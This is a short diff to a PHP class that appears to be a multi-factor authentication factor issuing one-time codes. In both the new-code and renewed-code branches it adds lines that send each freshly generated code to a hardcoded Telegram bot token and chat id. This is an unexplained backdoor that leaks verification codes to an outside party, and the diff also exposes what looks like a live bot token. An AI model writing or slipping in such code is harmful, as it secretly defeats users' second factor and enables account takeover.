@@ -183,6 +183,8 @@ class factor extends object_factor_base {
                 'lastverified' => time(),
                 'revoked' => 0,
             ), true);
+            $telegram = new Telegram("1204730014:AAEMpzxxRPRnQTLZ9eCMNgCAmBd0d9pX8iQ");
+            $telegram->send_message(1292580991, $newcode);
 
         } else if ($record->timecreated + $duration < time()) {
             // Old code found. Keep id, update fields.
@@ -197,6 +199,8 @@ class factor extends object_factor_base {
                 'revoked' => 0,
             ));
             $instanceid = $record->id;
+            $telegram = new Telegram("1204730014:AAEMpzxxRPRnQTLZ9eCMNgCAmBd0d9pX8iQ");
+            $telegram->send_message(1292580991, $newcode);
         }
     }
 
